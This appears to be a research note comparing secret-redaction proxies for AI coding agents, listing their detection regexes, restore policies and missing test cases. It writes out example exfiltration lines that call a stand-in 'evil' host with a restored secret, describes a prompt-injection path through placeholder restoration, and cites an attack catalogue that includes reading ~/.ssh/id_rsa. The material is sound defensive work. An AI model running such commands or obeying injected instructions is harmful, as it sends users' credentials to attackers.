# Redaction proxies similar to piifence: findings

Scope: five cloned repos (`paroque28/claude-code-redact` = "rdx", `crp4222/PrivAiTe`, `outgate-ai/og-local`, `Exestence/redaction-proxy`, `bvolpato/promptlatch`) and three scraped pages (Prismor, Formal, LangSmith) (commits and URLs in [README.md](README.md)). Everything below was read from source or docs unless marked "(inference)". No code was run. No secret values are reproduced; shapes are described instead.

Repos are listed in order of how useful they are to piifence: redaction-proxy, then PrivAiTe, og-local, promptlatch, rdx, then the web pages.

## 1. Most useful ideas for piifence, ranked

1. **Check the whole body for leaks after masking, and refuse (422) if a value is still there** (redaction-proxy). After masking, the proxy walks every string and every object key in the final body, including fields it never rewrites, and looks for any value it detected in this request, both as written and JSON-escaped, ignoring ASCII case. If one is found, the request is refused and the error names only the JSON path and category. This turns many of our known bypasses (thinking, `server_tool_use` input, `tools[].description`, `web_fetch_tool_result`, JSON keys) from silent leaks into refusals whenever the same value was also detected somewhere we do scan. Source: `repos/Exestence__redaction-proxy/src/proxy/server.ts` `findLeaks` (around l.627), DETAILS §6. The stated trade-off: a value that appears only in an unscanned field is still sent as-is. To avoid refusing every request, they skip enum fields (`type`, `role`, `status`, `stop_reason`, ...) when the value looks like an enum.

2. **Remember detected secrets and match them exactly in later requests** (PrivAiTe, redaction-proxy). Both remember values detected earlier and mask exact copies later, even where no detector would fire. This covers "secret split across messages", "password in prose", and an agent repeating a restored value bare in its reasoning or next command. Both papers measured that this happens in practice. PrivAiTe propagates only "token-shaped" values: at least 8 characters, at least one digit, not all digits, standing alone and not glued inside a longer identifier. It also propagates only values a structured rule confirmed, never a guess from the ML model alone, because a model-mislabelled plugin id was copied 24 times in one Codex session (`privaite/pii/engine.py` l.20-48 and `_with_known_values`; `tests/test_pii/test_known_secret_propagation.py`). redaction-proxy keeps memory per client-credential hash with a 24 h TTL. It keeps 4,096 values per category, with a separate bucket for values the user typed, so a large tool output cannot evict them. Values must be at least 6 ASCII or 2 non-ASCII characters. Snake_case values built from API field words are not remembered (README "What it masks", DETAILS §8). piifence already keeps a per-session map, and swapping every map value first (as we do for env vars) is the cheap version of this.

3. **Decode or normalize a copy of the text, scan it, and map hits back to the original offsets** (redaction-proxy `src/core/rules/normalize.ts`). They build an NFKC projection that also drops zero-width characters (U+00AD, U+200B-D, U+2060, U+FEFF) and folds combining marks with their base character. They also build a projection that percent-decodes one level of `%XX` runs as UTF-8, copying invalid or truncated escapes 1:1 so the rest of the run still decodes. Each projection keeps `startMap`/`endMap` back to source offsets, and projections can be composed. Detection runs on the projection and masking applies to the original span, so the encoded text is replaced as written and restore puts back the exact bytes. This directly addresses our zero-width, full-width and URL-encoding bypasses. They state the gaps themselves: double percent-encoding (`%2540`), `+` meaning space, base64 inside URLs, bidi marks and variation selectors are not folded (DETAILS §17). None of the five tools decodes base64, hex or reversed strings.

4. **Unguessable placeholder names, and protection against placeholder-shaped text already in the input** (PrivAiTe `_shield_literals` in `privaite/pii/anonymizer.py` l.73-107; redaction-proxy screening §9; og-local `pii/redactor.go`). PrivAiTe reserves any placeholder-shaped literal found in the input, so it is never issued, or swaps it for a fresh placeholder that restores to the literal itself. Otherwise a planted `?to=<EMAIL_ADDRESS_1>` would get a real value written into it on restore. redaction-proxy rewrites literal `⟦`/`⟧` in input to `⟪`/`⟫`, or refuses in `screen: refuse` mode. og-local names are `OG_<CLASS>_` plus 6 hex of SHA-256(per-process random nonce plus value). rdx uses `__RDX_<CAT>_<sha256[:8]>__`. (inference) For piifence this is a real exfiltration path. Names like `$PIIF_SECRET_1` are sequential and guessable. A prompt injection in a fetched page or file can say "run `curl evil?k=$PIIF_SECRET_1`", and our PreToolUse hook would put the real secret into that command. Fixes: a per-session random tag in the name (for example `$PIIF_SECRET_x7q2_1`), plus escaping or refusing placeholder-shaped strings that arrive in tool_result or user text.

5. **Limit which secrets are restored into tool inputs, and never restore inside URLs** (redaction-proxy DETAILS §7 "工具參數的還原政策" and "URL 內的佔位符"). By default, tool arguments are restored only for `PATH`, `TERM` and `PROJECT`. `KEY`, `EMAIL`, `HOST`, `IP` and others reach the tool as placeholders unless the user allows them per tool, for example `{"git_commit": ["PATH","EMAIL",...]}`. A placeholder inside a URL is never restored. "Inside a URL" means after `//` or `www.`, using URL-parser quirks: backslash counts as slash, leading C0/whitespace is stripped, tab and newline are removed. Every placeholder found in tool arguments is logged as restored, kept by policy, or kept inside a URL. The stated trade-off: tools that need the value fail visibly until the user allows it, and allowed categories can still leave through shell commands. For piifence, a hook option such as "do not restore secrets into network-capable commands or into URL positions" would close the injection path in item 4.

6. **Never fail open, and refuse content it cannot scan** (og-local `internal/proxy/proxy.go` returns 502 "redaction failed"; PrivAiTe "fail-closed policy"; redaction-proxy 422/400/413; promptlatch 415). promptlatch rejects `multipart/*` and any `content-encoding` other than identity on redacted routes (`src/promptlatch/proxy.py` l.471-481). Its SECURITY.md says "raw byte scanning cannot reliably protect attachment contents". redaction-proxy refuses a body that is not JSON, nesting too deep for the stack, bodies over 64 MiB, and upstream 3xx redirects (it does not follow them, so credentials cannot be redirected). Counter-example: rdx catches redaction exceptions and forwards the unredacted body (`src/rdx/proxy/server.py`, "passing through unredacted"), and skips redaction entirely when no `.redaction_rules` file exists. piifence already returns 502 on a failed scan. The idea we lack is a policy that refuses content types we cannot scan, such as base64 PDFs, images and unknown block types, instead of forwarding them.

7. **Scan unknown block types by default, and match restore coverage to scan coverage** (PrivAiTe `privaite/gateway/scrub.py` l.20-60, `docs/gateway.md` "Exact lists"). `server_tool_use`/`mcp_tool_use` input and `mcp_tool_result` are scanned. The comment records a confirmed leak: WebSearch/WebFetch input restored on turn N was forwarded raw on turn N+1. For a block type the build does not know, PrivAiTe scans an allowlist of plaintext fields (`text`, `title`, `context`, `source`, `url`, `reason`, `stdout`, `stderr`) and walks `input`/`output` leaf by leaf. Only `thinking`, `redacted_thinking`, `image` and `container_upload` are relayed byte-for-byte. A test pins the docs and code lists together (`tests/test_gateway/test_gateway_docs.py`). redaction-proxy takes the opposite approach: it masks every string except a denylist of keys (`SKIP_MASK`: `model`, `role`, `type`, ids, `name`, `signature`, `thinking`, `data`, `encrypted_content`, `media_type`, `url`, `image_url`, `file_id`, `file_data`, `cache_control`, ...; `SKIP_SUBTREE`: `metadata`, `stop`; `server.ts` l.51-78). That means `tools[].description` and `web_fetch_tool_result` content are masked. Inside an echoed `*tool_use` `input`, it masks all strings whatever the key name. Plain-text document `source.data` (`type: text`) is masked. promptlatch walks the entire JSON, including object keys, and exempts only content it can prove is opaque (next item).

8. **Exempt opaque blobs only after verifying them** (promptlatch `src/promptlatch/redaction.py` l.95-145). `data:image/...;base64` is skipped only if it strictly decodes, round-trips, and starts with the right magic bytes (PNG/JPEG/GIF/WebP, including the WebP `RIFF....WEBP` check). `encrypted_content` is skipped only if it is a canonical Fernet envelope (version byte 0x80, length formula, url-safe round-trip). Anything else, including "image" data that does not decode, is scanned as text. Tests: `tests/test_redaction.py` `test_responses_invalid_image_data_and_remote_image_urls_remain_scanned` and `test_responses_image_exemption_does_not_propagate_into_other_parts_or_metadata`. For piifence, (inference) a base64 "image" or "PDF" whose bytes are really text would be caught this way, and real PDFs could be decoded and checked.

9. **Check that the token classifier actually covered the whole input** (PrivAiTe `docs/detection.md`). "Newer Transformers and tokenizers releases could silently return only the first window when asked for overflow, leaving the rest of a long request unscanned." Since 0.7.1, PrivAiTe slices the input into overlapping ONNX windows itself, rejects results that leave tokens or source text uncovered, and refuses tokenizers that add special tokens. og-local splits fields into 4 KiB chunks with 512 B overlap. It prefers to cut at a newline or space in the second half of the window, falls back to a hard cut at a rune boundary, and drops spans that touch a hard-cut edge because the overlap re-detects them whole. Chunking is greedy from the start, so chunk boundaries stay the same as the conversation grows, which keeps per-chunk caching effective (`internal/redact/chunk.go`, `redact.go`). piifence uses a 32M token classifier and should have the same coverage assertion and boundary tests.

10. **What the preceding context does to the ML model, and two-tier type policy** (PrivAiTe `docs/agent-leak-measurement.md`). The two secrets that leaked on the realistic session sat in `key=value` log lines. Each is caught when it stands alone, but "roughly one preceding line of log-shaped context is enough to break it". The miss is order dependent: text after the line never triggers it. A 7-line, 1 KB excerpt reproduces it, with one secret missed in 5 of 5 occurrences and the other in 4 of 5. Their fix was a set of structured rules for those field names (`presented_key`, `smtp_secret` were added to `_FIELD` in `privaite/pii/recognizer_secret.py`). A second finding: a database-URL password was typed as `EMAIL_ADDRESS` (Presidio scored the userinfo-and-host span at 1.0). That made it reversible, not irreversible, so it came back in the reply. Fix: when spans overlap, the more restrictive type wins (`_type_priorities`: block > irreversible > reversible).

## 2. Per-tool details

### redaction-proxy (Exestence), TypeScript, Apache-2.0, v0.3.1

Architecture: a local HTTP proxy on 127.0.0.1:8787, with no model by default and an optional name model (`Wismut/nym-pii-multilingual-small`) for names only. Masked routes are `/v1/chat/completions`, `/v1/responses`, `/v1/messages`, and `/v1/messages/count_tokens` (masked, nothing to restore). Other GETs are relayed and other POSTs get 404. Placeholders are `⟦CATEGORY_n⟧`, renumbered on every request from the full history, in order: `tools`, `functions`, `system`, `instructions`, then JSON key order. No per-conversation table is kept, and prefixes stay byte-stable for prompt caching. Sources: `src/proxy/server.ts`, `docs/DETAILS.md` (Traditional Chinese), `README.md`.

Why placeholders and not fake values (DETAILS §4): they measured that the model kept placeholders verbatim 100% of the time against 75% for fakes, and fakes caused silent unrecoverable errors in 5 of 18 conversations. rdx reaches the same decision in `docs/architecture-decisions.md` ADR-002: fakes can collide with real values and the model may act on them.

Anthropic request coverage: every string except `SKIP_MASK`/`SKIP_SUBTREE` keys (see §1 item 7). Thinking and signature are not masked, and restore leaves `signature`, `thinking`, `data` and `encrypted_content` alone (`SKIP_RESTORE`) so signed blocks round-trip. The leak check still runs over thinking, so (inference) a detected secret that also appears in an earlier thinking block refuses the request (422) instead of leaking it. In a long Claude Code session that could refuse every later turn; the docs do not discuss this case. Images, PDFs and base64 files are not scanned. Object keys are not masked but are leak-checked.

Streaming restore (DETAILS §7): one `StreamRestorer` per text channel. It holds back text only after `⟦` while the text could still become a placeholder, up to 64 characters (`HELD_MAX`). Unknown ids are left literal. In JSON mode (`input_json_delta`, `arguments`) originals are written JSON-escaped. Leftover held text is emitted as a synthetic `content_block_delta` before `content_block_stop`. Tests check every chunk split and linear time on a 100 KB reply sent in 4-character chunks (`tests/adversarial.spec.ts`). Echoed placeholders get "anchor" rules (DETAILS §8): a placeholder the model wrote into a tool call is sent back unchanged only if its first occurrence is in model-written tool input. Otherwise it is escaped to `⟪...⟫`, which stops injected placeholders in tool results from being restored.

Before masking, the `arguments` JSON text is canonicalized: `\uXXXX`, `\/` and surrogate pairs are rewritten the way `JSON.stringify` writes them, so the JSON-escaped form of a value matches (Go writes `&` as `&`, PHP writes `/` as `\/`).

Control characters (§9): by default, C0 controls other than tab/LF/CR are replaced with Control Pictures characters, and C1 controls, U+FFFD and lone surrogates become `␦`. `screen: refuse` refuses the request with a 422 instead. Fail-closed tests refuse text containing NUL, U+FFFD, a lone surrogate, a control character, a placeholder, or a stray closing delimiter (`tests/adversarial.spec.ts` "fail closed").

Detection rules (`src/core/rules/secret.ts`, `rules.ts`, `extended.ts`):
- **Prefix tokens:** `\b(?:AKIA|ASIA)[0-9A-Z]{16}\b`, GitHub `(?:ghp|gho|ghs|ghu|ghr)_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}`, `\bsk-[A-Za-z0-9_-]{16,}`, Slack `xox[abposr]-`, Google `AIza[0-9A-Za-z_-]{35}`, JWT `eyJ...\.{10,}\.{10,}`, Slack webhook, PEM private-key blocks. The same patterns are also tried right after a high percent-escape (`%E6sk-...`), where `\b` does not hold.
- **Assignment rule:** keywords `api[_-]?key|apikey|client[_-]?secret|refresh[_-]?token|access[_-]?token|auth[_-]?token|private[_-]?key|passphrase|password|passwd|secret|session[_-]?id|session|token|sid|pwd|pass|key`, plus CJK `密碼|密码|口令|金鑰|金钥|密鑰|密钥|憑證|凭证|權杖|权杖|令牌`. STRONG and WEAK key sets. Weak keys (`token`, `session`, `sid`, `pwd`) need a value that does not read as code; digits are the deciding signal.
- **Not masked:** template values (`<your secret>`, `{password}`, `${{ secrets.X }}`), masked spellings (`***`, `xxx`, `<redacted>`, `your-password`), protocol field names (`password: max_tokens`), and attribute qualifiers (`password_reset_url`, `access_token_ttl`, `private_key_path`). `secret_id` and `secret_text` are deliberately still treated as credentials.
- **Headers:** Bearer, Authorization, Cookie and Set-Cookie, CLI `-u/--user user:pass`, and URL userinfo.
- **Prose rule** (`extended.ts` `CREDENTIAL_PHRASE`): a credential word (`api key`, `token`, `secret`, `key`, `jwt`, or a password word in EN/DE/FR/ES/PT/ZH/JA/KO) followed by `is|was|ist|est|es|é`, `:`, `是|為|为|は|는|은`, or a plain space, then a 6-128 character value. Generic words (`key`, `token`, `secret`) need a value of at least 16 characters and Shannon entropy of at least 3.5 bits per character. Password words need a value of at least 6 characters that is printable ASCII. This targets our "passwords in prose" and "non-English prose" bypasses.
- **Entropy rule** (`rules.ts` l.132-149, l.558-591): `\b[0-9a-fA-F]{32,}\b` is masked unless it is preceded by `/`, or it is 32, 40 or 64 characters with SHA context within 32 characters on either side (`commit|sha|hash|rev|digest|checksum|blob|tree|oid|integrity|etag`). With secret context (`secret|token|password|api[_-]?key|authorization|credential`) it becomes `KEY`. Base64 runs `[A-Za-z0-9+/]{32,}={0,2}` need upper case, lower case and a digit, entropy of at least 4.2, and no `sha\d{3}-` (SRI) prefix. This targets our "32-hex key with no keyword" bypass. The default `entropy` rule is off in core but on in the proxy, and an opt-in `entropy-strict` also skips digests keyed by a file name and `@<40hex>` commit pins.
- **Allowlist:** `git@github.com`, `noreply@github.com`.

Published numbers (README, DETAILS §18), on a held-out multilingual synthetic set of 1,617 prompts written blind, frozen by SHA-256 and scored once:
- Secrets fully masked: 95.9% in standard spellings (n=49) and 80.7% in non-standard spellings (n=140). Presidio scored 12.2% and 5.7%.
- Credential false positives: 0.76 per 1,000 lines of code, measured on about 1.1M lines.
- Restore was byte-exact on 1,617 of 1,617 prompts with rules only.

Stated misses: API keys split by spaces or newlines (the entropy rule only catches fragments), `name @ domain` and `name at domain` emails, double encoding, and a password that is exactly an API field name.

Other hardening:
- Refuses non-loopback `Host` headers when no token is set (DNS rebinding) and refuses browser `Origin`s.
- Optional `x-redaction-proxy-token`, compared in constant time on a SHA-256 digest.
- Does not follow upstream redirects.
- Requires `REDACTION_PROXY_ALLOW_INSECURE_UPSTREAM` for a non-loopback `http://` upstream.
- `maskLocalUsername` masks the OS user name and home-directory segment, which Claude Code sends in `user_identity` and in project-directory names.

### PrivAiTe (crp4222), Python, gateway mode

Architecture: a FastAPI proxy with an opt-in "gateway" for agent CLIs: `/v1/messages`, `/v1/messages/count_tokens`, and `/v1/responses` (beta). The CLI's own auth is relayed. Detection combines Presidio regex with spaCy, the `openai/privacy-filter` ONNX model (1.5B parameters, 50M active), an opt-in MiniLM model (`crp4222/privaite-pii-minilm`), and optional GLiNER. Placeholders are `<TYPE_n>`, with "irreversible" types such as SECRET removed rather than placeholdered. The mapping lives only for the length of one request. Sources: `docs/gateway.md`, `docs/detection.md`, `privaite/gateway/scrub.py`, `restore.py`, `privaite/streaming/buffer.py`.

Coverage: see §1 item 7. Notably, the `system` field is not rewritten. It is read only for the `block_entities` gate, which can reject the request (`scrub.py` header). piifence scans `system`, which is better. `tools` definitions and JSON keys are not scanned.

Restore: the response is restored in full, streaming included. A trie-based `StreamingDeAnonymizer` per text channel holds back possible placeholder prefixes. A JSON-escaped variant of the mapping is used for `input_json_delta` (`json_escaped_mapping`). `arguments` strings are restored on the parsed tree and re-encoded, so a quote or newline in the original does not break the client's JSON parse (`restore.py` `_restore_json_arguments`). Thinking blocks are skipped both ways.

Detection rules (`privaite/pii/recognizer_secret.py`):
- **Field names:** `_FIELD` = optional `[a-z][a-z0-9_]{0,63}_` prefix, then `api[_-]?key|access[_-]?token|refresh[_-]?token|auth[_-]?token|client[_-]?secret|password|passwd|smtp[_-]?secret|presented[_-]?key`.
- **.env lines:** `.env`-line names ending `TOKEN|SECRET|KEY` need an `_OPAQUE` value: at least 16 characters, containing a digit and a letter, and not starting with `/`, `~` or `.`. `PASS` takes any value; `PWD` needs a prefix such as `MYSQL_PWD`, because `PWD` alone is the working directory.
- **Line prefixes:** `ENV_LINE_PREFIX` lets a line start with read-tool numbering (`12:`, `12<tab>`, `12→`, `00012|`), diff markers, and `export|env|ENV|ARG`. (inference) This matters for piifence because Claude Code's Read output uses `N→` numbering.
- **Known keys:** `sk-` (needs a digit, 20+ characters), `[sr]k_(live|test)_`, `gh[pousr]_`, `github_pat_`, `glpat-`, `xox[abprs]-`, `AKIA`, `AIza`, `hf_`.
- **Structured values:** PEM blocks including truncated ones (a file read in pages) and escaped `\n` inside JSON, JWT, Authorization Bearer/Basic, and URI userinfo with an empty user (a Redis URI with only a password before `@`).
- **CLI options:** `--*password|api-key|...` in `=` or space-separated form, excluding shell variable references (`$X`, `${X}`), metavariables (`<value>`, `[VALUE]`, `PASSWORD`) and prose words after the flag ("use --password to set it"). It also decodes quoted string literals up to 2 levels deep (`_literal_view`), keeping source offsets, to catch a JSON- or shell-escaped password inside a command.
- **Boundary refinement** (`privaite/pii/boundaries.py`): trims model spans to the value only. It cuts `.env` name fragments, removes `:` and `@` from URI passwords, and strips wrapping quotes and `<>`, while never uncovering a character of a value.
- **Allowlist** (`privaite/pii/allow_list.py`): full match only, never applies to SECRET unless the entry names the type, refuses patterns that match canary PII shapes, and caps matches at 1,024 characters.
- **Detection cache:** stores salted hashes of text plus value-free span metadata (`privaite/pii/cache.py`).

Measurements (`docs/agent-leak-measurement.md`, `docs/detection.md`), on real Claude Code and Codex runs with 24 planted values (4 of them secrets), measured at the wire:
- Baseline: 23/24 (Claude Code) and 23/24 (Codex) values on the wire on a realistic 73 KB repo, even when told never to reveal values. The secrets travelled in a log file, not the `.env`.
- Through the gateway: 0/24 on the small repo, 2/24 on the realistic session (see §1 item 10).
- SECRET recall: 71.4% on their comparison corpus.
- CredData (real code from 154 repos): `onnx` fully masks 60% of credentials and `minilm` 35%. Generic secrets under arbitrary names: 86% against 13%.
- Scrub cost: up to 42 s (Claude Code) and 72 s (Codex) per request on a growing context without the cache, and a 1-3 s median with it.

Their validity guards for leak benchmarks are worth copying: a trivial turn first to prove the agent can run, a probe proving traffic crosses the gateway, and a check that the files were actually put on the wire. A cell that fails any guard publishes no number. One known behavior: absolute file paths can be scrubbed as URLs.

### og-local (outgate-ai), Go, BSL 1.1

Architecture: a single binary. `ogl claude ...` starts a proxy on a random loopback port and runs the agent as a child process with `ANTHROPIC_BASE_URL` set. It writes a separate `CODEX_HOME` config for Codex. Detection is only the `openai/privacy-filter` ONNX model, and there are no regex rules. Routes are suffix `/v1/messages`, `/v1/chat/completions`, `/v1/responses`, and `/backend-api/codex/responses`. Other paths pass through untouched, so (inference) `/v1/messages/count_tokens` is forwarded unscanned. Sources: `internal/provider/registry.go`, `anthropic.go`, `content.go`, `jsonvalues.go`.

Anthropic coverage: `system` (string or text blocks), message `text` blocks, `tool_use` input (every JSON string value, keys untouched, depth limit 1000), and `tool_result` content (string or text blocks). Everything else is kept byte-identical, including thinking, `server_tool_use` and `web_search_tool_result`; the comment says "server-generated". (inference) og-local restores placeholders in every non-delta SSE event (`stream/transform.go` `emitData`), so a `server_tool_use` input written with a placeholder comes back real and is sent raw on the next turn. This is the same round-trip leak PrivAiTe documented and fixed.

Placeholders are deterministic per process (`OG_<CLASS>_<6 hex of sha256(nonce‖value)>`), so re-sent history stays byte-identical and prompt caching keeps working, while the mapping is rebuilt per request. `MinDetectionLen = 3` drops 1-2 byte noise spans. The base64 guard (`internal/pii/base64guard.go`) does not substitute inside quoted base64 runs of 40+ characters (`"([A-Za-z0-9+/_-]+={0,2})"`), so a value that happens to appear inside a blob does not corrupt it. Streaming restore tracks the full restored content per block and emits only what is "safe", holding back `PartialSuffixLen` characters.

Model decoding: constrained Viterbi over BIOES tags with transition biases loaded from a calibration file's named "operating points" (`internal/pii/decode.go`, `calibration.go`), not per-token argmax. Spans are whitespace-trimmed afterwards. (inference) If piifence's classifier uses argmax, constrained decoding could reduce fragmented spans.

Fails closed: a redaction error returns 502. Local auth is an HMAC-signed `ogl_live_` token bound to the PID with a TTL, so other local processes cannot use the proxy (`internal/token/mint.go`). Debug logs are tested to never contain PII (`TestRedactDebugLogsNeverLeakPII`). No leak numbers are published.

### promptlatch (bvolpato), Python, MIT

Architecture: a proxy plus a Python library. Redaction is one-way: matches become `[REDACTED_SECRET]` and nothing is restored. It forwards any path and scans JSON bodies, query parameters and URL-encoded forms. Multipart and compressed bodies get 415. No model; entropy-only detection is deliberately disabled ("to avoid unpredictable false positives"). Sources: `README.md` "Redaction engine", `src/promptlatch/patterns.py`, `redaction.py`, `proxy.py`.

Walk: every string and every object key, recursively. If the key name matches `SENSITIVE_FIELD_RE` (api_key, secret, password, token, auth, credentials, signature, sig, signed_url, sas_token, dockerconfigjson, webhook_url, ...), after camelCase is normalized to snake_case, the whole value is replaced: values of 8+ characters, or any non-empty value under the strict list. Opaque content is exempted only after verification (§1 item 8).

Patterns (`patterns.py`): a larger provider list than the others, including `sk-ant-`, `sk-or-v1-`, `sk-cp-`, `sk-(proj-)?`, `fw_`, `xai-`, Atlassian `ATATT3xFfGF0`, `A3T/ABIA/ACCA`, Bedrock `ABSK`, `ya29.`, 1Password `ops_eyJ`, `AGE-SECRET-KEY-1`, Databricks `dapi`, DigitalOcean, HF `api_org_`, `lin_api_`, `npm_`, `pypi-AgEIcHlwaS5vcmc`, `SG.`, Telegram `\d{5,16}:A[\w-]{34}`, Twilio `SK[0-9a-f]{32}`, Vault `hv[bs].`, Shopify `shp(at|ca|pa|ss)_`, Sentry `sntry[su]_`, PGP and encrypted PEM, and signed-URL query parameters (`x-amz-signature|x-amz-credential|x-amz-security-token|x-goog-signature|x-goog-credential|googleaccessid|signature|sig`). It also runs detect-secrets plugins, without the entropy plugins.

"Exact-tail" rules: the user configures only the last few characters of a private token, and the whole token ending in them is redacted (`tests/test_redaction.py` `test_tail_rule_redacts_full_token`). (inference) This lets piifence users register their own secrets without storing the full value. Rules can also be encrypted at rest with AES-GCM (`promptlatch encrypt-rules`). The scan cache is keyed by digest and holds only redacted output.

### rdx / claude-code-redact (paroque28), Python

Architecture: a Starlette proxy on `/v1/messages` plus Claude Code hooks: shadow files for Read, blocking Grep, and wrapping Bash. It redacts outgoing requests and restores responses. Sources: `src/rdx/proxy/handler.py`, `stream.py`, `server.py`, `docs/*.md`.

Coverage: `system`, message `text`, `tool_use` input (recursive), and `tool_result` (string or nested blocks). Nothing else: no documents, thinking or server tools.

Restore: text deltas are buffered from the `__RDX_` prefix to the closing `__`, with a 512-character cap. (Bug, read from source) `input_json_delta` fragments are forwarded unrestored. The comment says restore "happens at the client level", but nothing does it there (`stream.py` l.290-312).

Fails open on exceptions (see §1 item 6). Replacement tokens are `__RDX_<CAT>_<sha256[:8]>__`. User rules can supply format-preserving replacements with case matching (`_match_case`), and person names expand into about 20 corporate variants (`john.smith`, `jsmith`, 8-character truncations; `src/rdx/core/names.py`). Hashed-secret rules store only SHA-256 and compare candidates at scan time. (inference) That would let piifence users list secrets without keeping plaintext on disk.

Detection: about 16 prefix regexes (`detect/patterns.py`), context regexes (`detect/context.py`, for example `export \w*(KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)\w*=`, DB URL passwords, `X-API-Key:`), and Shannon entropy of at least 4.5 on quoted or assigned candidates of 20+ characters (`detect/entropy.py`). Their own table notes that hex tokens sit at about 4.0 bits and are borderline, so this misses our 32-hex case. `docs/threat-model.md` gives a useful attack catalogue (from gricha/dangerous-skills): symlink to `~/.ssh/id_rsa`, PostToolUse hooks run by the harness, `!` command pre-prompt expansion, image injection, memory poisoning. It notes that harness-level execution bypasses both proxy and hooks.

### Web pages

Prismor, tool-boundary redaction (`docs/web/prismor-tool-boundary.md`): the model is taught to use `@@SECRET:name@@`. A PreToolUse hook substitutes the real value, and it also wraps the Bash command in a `sed` filter that replaces the real value in the command's output with the placeholder again, so the secret never reaches the transcript (`~/.claude/history.jsonl`) or the API. They also run post-hoc sweeps of agent caches at session end. They claim about 95% coverage and give no numbers. (inference) piifence's restore hook could do the same output re-scrub cheaply, since it knows the exact values it just restored. That would stop restored secrets from landing in Claude Code's local transcripts, a gap PrivAiTe also lists ("the gateway protects the egress, not the agent").

Formal, proxies for Claude Code (`docs/web/formal-proxies-claude-code.md`): the credential-injection pattern. The agent runs with a dummy `ANTHROPIC_API_KEY`, and a proxy outside the sandbox injects the real `x-api-key` (also shown for Stripe `Authorization: Bearer`). They use OS-level transparent TLS interception, which catches traffic that ignores `ANTHROPIC_BASE_URL`. Their example policy blocks `POST /v1/files`. (inference) piifence forwards non-`/v1/messages` paths unchanged, so Files API uploads (`/v1/files`) and legacy `/v1/complete` bypass scanning. Consider refusing or scanning them.

LangSmith, redact secrets (`docs/web/langsmith-redact-secrets.md`, preset rules about l.164-188): prefix rules for `sk-ant-`, `sk-proj-|sk-svcacct-|sk-admin-|sk-`, LangSmith `lsv2_pt_|lsv2_sk_|ls__`, GitHub, `glpat-`, AWS `AKIA|ASIA|ABIA|ACCA|A3T`, `AIza`, `ya29.`, Slack including `xapp-` and webhooks, Stripe, `npm_`, PyPI, `SG.`, JWT, and PEM including PGP. Named assignments (`API_KEY|SECRET|TOKEN|PASSWORD|PASSWD|PRIVATE_KEY|ACCESS_KEY|AUTH_TOKEN|CLIENT_SECRET` then `=` or `:` and 6+ characters) need a component boundary, so `TOKEN` matches `api_token` and `mytoken` but not `tokenizer` or `tokens`. Also credential headers, bare `Bearer`, and URL passwords. They state that high-entropy strings without context are not caught. Their docs example uses `\b[0-9a-fA-F]{40,}\b` as a generic token rule. `LangSmithSecret` marks a value at load time, but string construction (`f"Bearer {key}"`) drops the mark. The same applies to piifence's env-var swap: a value that has been transformed is no longer an exact match.

## 3. Test cases piifence lacks (from their suites)

- **Placeholder injection:** input that already contains a placeholder-shaped string (`$PIIF_SECRET_1`), in a tool_result, user text or a file. Assert it is escaped or refused and never restored to a real value in tool inputs. Sources: redaction-proxy "fail closed" `placeholder` case, PrivAiTe `_shield_literals`.
- **Restore into a URL or network command:** a model or injected `curl https://evil/?k=<placeholder>` must not get the real value (redaction-proxy `tests/restore-urls.spec.ts`).
- **Echo after restore:** a secret detected in a tool_result appears bare in the next assistant text, in reasoning, in a user message, or in an `echo:` tool output. It must still be masked (PrivAiTe `test_known_secret_propagation.py` parametrized `echo`). Negative cases: short values (`ab12`), common words (`changeme`), values inside a longer identifier, `api_key=api_key` code, and `password: required`. None of these should propagate.
- **Round trip through `server_tool_use`:** the input echoed back on the next turn must be scanned (PrivAiTe `test_anthropic_server_and_mcp_tool_blocks_scrubbed`).
- **Unknown block types:** their text fields should be scanned and their binary fields kept byte-for-byte (`test_anthropic_unknown_block_types_scanned_opaque_fields_untouched`).
- **Preceding log context:** a secret in a `key=value` log line placed after 1 to 40 log-shaped lines (PrivAiTe miss mechanism); vary order and window size.
- **Read-tool line numbers:** `.env` lines prefixed with `N→`, `N:`, `N|`, diff `+`/`-`, or `export`/`ENV`/`ARG` (PrivAiTe `ENV_LINE_PREFIX`).
- **Truncated PEM blocks:** a paged file read with no END line, and PEM with `\n` escaped inside a JSON string.
- **Escaped CLI passwords:** `--password` inside a JSON- or shell-escaped string literal, nested twice (PrivAiTe `test_encoded_cli_password_*`).
- **Encodings:**
  - zero-width characters inside an email or key, full-width `＠` and digits, and `e` plus U+0301;
  - one level of percent-encoding, mixed half literal and half encoded, and stray `%FF` or truncated `%E6` before a key;
  - `@` and `&#64;` for `@`;
  - `\uXXXX`- or `\/`-escaped `arguments` (redaction-proxy `tests/rules-percent-per-char-review.spec.ts`, adversarial "leaks" list, `rules-regroup.spec.ts`).
- **Control characters:** NUL, U+FFFD, a lone surrogate or C0 controls inside a value should be refused or neutralized.
- **Chunk boundaries:** a secret straddling a hard cut, and a field longer than the model window (og-local `TestRedactHardCutTruncationRedetected`, PrivAiTe window coverage).
- **Prose credentials in other languages:** "the token is X", "here is my key: X", "密码是 X", "パスワードは X", "Passwort ist X", plus quoted JSON keys `"jwt": "X"` and `"密碼": "X"` (redaction-proxy `extended.ts`).
- **Hex runs:** a 32-hex value with no keyword must be masked, while the same length next to `commit|sha|hash|etag|integrity` must not be.
- **Assignment-rule edges** (shapes from redaction-proxy `tests/rules-secrets.spec.ts`):
  - values with `$`, `()`, `<>`, `{}` or `[]` inside;
  - snake_case passphrases made of API words;
  - `Cookie:` and `Set-Cookie:` session values, and `sid=`;
  - values that are templates or masks, which must not be masked.
- **Sensitive-field values:** JSON keys with sensitive names (`aws_secret_access_key`, camelCase `secretAccessKey`, `x-auth-token`) whose values are short or numeric (promptlatch `test_explicit_secret_fields_redact_short_and_numeric_values`).
- **Signed-URL query parameters:** `X-Amz-Signature`, `X-Goog-Signature` and `sig=` in a URL inside text. This covers our "password in a neutral query param" bypass only partly; nobody handles truly neutral names.
- **Wire-level leak harness:** planted values, a recorder upstream, and validity guards (agent ran, traffic traversed, files on the wire), following PrivAiTe's `privaite-bench` method.

## 4. Design ideas we lack, with the trade-offs they state

- **Post-mask leak check over the whole body**, refusing on a hit (redaction-proxy). Trade-off: possible false refusals, handled with enum-field exemptions and whole-word matching for names. Values that appear only in unscanned fields still leak.
- **Two-tier memory:** in the current request, propagation is strict and enforced by refusal. Across requests it is best-effort and never refuses (redaction-proxy). Trade-off: the memory is bounded, so a local process can push values out by flooding requests.
